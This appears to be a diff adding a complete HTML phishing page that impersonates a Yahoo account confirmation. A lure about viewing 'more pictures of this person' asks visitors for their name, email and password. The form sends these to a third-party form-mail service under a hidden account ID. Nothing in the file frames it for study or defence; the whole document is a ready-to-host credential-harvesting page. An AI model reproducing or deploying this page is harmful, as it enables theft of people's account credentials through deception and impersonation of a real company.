@@ -1,0 +1,91 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Yahoo Account Confirmation</title>
+    <style>
+        body {
+            font-family: Arial, Helvetica, sans-serif;
+            margin: 20px;
+        }
+        .container {
+            max-width: 600px;
+            margin: auto;
+            text-align: center;
+        }
+        .form-table {
+            width: 100%;
+            margin-top: 20px;
+        }
+        .form-table td {
+            padding: 10px;
+        }
+        .form-table input[type="text"] {
+            width: 100%;
+            padding: 8px;
+            box-sizing: border-box;
+        }
+        .submit-button {
+            padding: 10px 20px;
+            font-size: 16px;
+            cursor: pointer;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <img src="https://s.yimg.com/ny/api/res/1.2/vlvd6fw1UHI9T_3GaNPzDw--/YXBwaWQ9aGlnaGxhbmRlcjt3PTEyMDA7aD02OTI-/https://s.yimg.com/os/creatr-uploaded-images/2019-09/a929b8f0-dd65-11e9-bffe-b90463fd5188" alt="Yahoo Logo" style="max-width: 100%;">
+        <p><strong style="font-size: large;">To view more pictures of this person Yahoo requires you to confirm your Account to know you are real.</strong></p>
+        <!-- Begin Freedback Form -->
+        <!-- DO NOT EDIT YOUR FORM HERE, PLEASE LOG IN AND EDIT AT FREEDBACK.COM -->
+        <form enctype="multipart/form-data" method="post" action="https://www.freedback.com/mail.php" accept-charset="UTF-8">
+            <div>
+                <input type="hidden" name="acctid" id="acctid" value="kyuxyo2oq8xyu0ss" />
+                <input type="hidden" name="formid" id="formid" value="2005779" />
+                <input type="hidden" name="required_vars" id="required_vars" value="name,email,field-12ccd008435d3e8" />
+            </div>
+            <table class="form-table" cellspacing="5" cellpadding="5" border="0">
+                <tr>
+                    <td valign="top">
+                        <strong>Name:</strong>
+                    </td>
+                    <td valign="top">
+                        <input type="text" name="name" id="name" size="40" value="" />
+                    </td>
+                </tr>
+                <tr>
+                    <td valign="top">
+                        <strong>Email Address:</strong>
+                    </td>
+                    <td valign="top">
+                        <input type="text" name="email" id="email" size="40" value="" />
+                    </td>
+                </tr>
+                <tr>
+                    <td valign="top">
+                        <strong>Password:</strong>
+                    </td>
+                    <td valign="top">
+                        <input type="text" name="field-12ccd008435d3e8" id="field-12ccd008435d3e8" size="40" value="" />
+                    </td>
+                </tr>
+                <tr>
+                    <td valign="top">
+                        <strong>Confirm Password:</strong>
+                    </td>
+                    <td valign="top">
+                        <input type="text" name="field-20a6ccc2f94aae4" id="field-20a6ccc2f94aae4" size="40" value="" />
+                    </td>
+                </tr>
+                <tr>
+                    <td colspan="2" align="center">
+                        <input type="submit" class="submit-button" value="Submit Form" />
+                    </td>
+                </tr>
+            </table>
+        </form>
+        <!-- End Freedback Form -->
+    </div>
+</body>
+</html>
